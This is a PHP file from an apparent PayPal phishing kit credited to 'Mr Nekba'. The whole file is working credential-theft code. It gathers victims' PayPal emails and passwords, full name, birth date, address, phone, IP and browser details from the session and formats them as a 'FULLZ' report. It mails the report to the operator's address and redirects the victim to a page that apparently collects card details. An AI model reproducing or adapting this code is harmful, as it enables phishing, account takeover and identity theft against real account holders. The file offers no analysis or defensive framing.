<?php



session_start();
$time = date('d/m/Y G:i:s');
include('../config.php');
include('../get_browser.php');

$S_Z118 .= "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ Account PayPal FULLZ ####################<br/>
<div>
<span style='font-size: 15px;'>################</span> <font style='color: #DF0000;' ><img src=\"http://img15.hostingpics.net/pics/951888ppl.png\" style='position: relative;top: 8px;'></font> <span style='font-size: 15px;'>####################</span></div>
<div>
±±±±±±±±±±±±±±±±±[ LOGIN INFORMATION ]±±±±±±±±±±±±±±±±±±±±<br>
› [PP Email1]     = <font style='color:#0070ba;'>".$_SESSION['_login_email1_']."</font><br>
› [PP Password1]  = <font style='color:#0070ba;'>".$_SESSION['_login_password1_']."</font><br>
› [PP Email]     = <font style='color:#0070ba;'>".$_SESSION['_login_email_']."</font><br>
› [PP Password]  = <font style='color:#0070ba;'>".$_SESSION['_login_password_']."</font><br>
±±±±±±±±±±±±±±±±[ PEROSNAL INFORMATION ]±±±±±±±±±±±±±±±±±±<br>
› [Full Name]      = <font style='color:#0070ba;'>".$_SESSION['_fullName_']."</font><br>
› [Date Of Birth]  = <font style='color:#0070ba;'>".$_SESSION['_birth_date_']." Format (DD/MM/YYYY)</font><br>
› [Address line]   = <font style='color:#0070ba;'>".$_SESSION['_address_']."</font><br>
› [Country]        = <font style='color:#0070ba;'>".$_SESSION['_countrycode_']."</font><br>
› [City]           = <font style='color:#0070ba;'>".$_SESSION['_city_']."</font><br>
› [State]          = <font style='color:#0070ba;'>".$_SESSION['_state_']."</font><br>
› [Zip Code]       = <font style='color:#0070ba;'>".$_SESSION['_zipCode_']."</font><br>
› [Phone Number]   = <font style='color:#0070ba;'>".$_SESSION['_phoneNumber_']."</font><br>
±±±±±±±±±±±±±±±±[ VICTIME INFORMATION ]±±±±±±±±±±±±±±±±±±±<br>
› [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font>
› [Country]        = <font style='color:#0070ba;'>".$_SESSION['_countryname_']."</font><br>
› [TIME]    = <font style='color:#0070ba;'>".$time."</font><br>
› [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
################## BY Mr Nekba #####################
</html></div>\n";

    $subject = "Mr Nekba | Billing Fr0m [".$_SESSION['_countryname_']."] [".$_SESSION['_ip_']."] ";
    $headers = "From:Mr Nekba <resulta@bill.com>";
    $headers .= $_POST['eMailAdd']."\n";
    $headers .= "MIME-Version: 1.0\n";
    $headers .= "Content-type: text/html; charset=UTF-8\n";
    @mail($email, $subject, $S_Z118,$headers);
	header("Location: ../websc_card/?cmd=_session=".$_SESSION[_countrycode_]."&".md5(microtime())."&dispatch=".sha1(microtime())."");

?>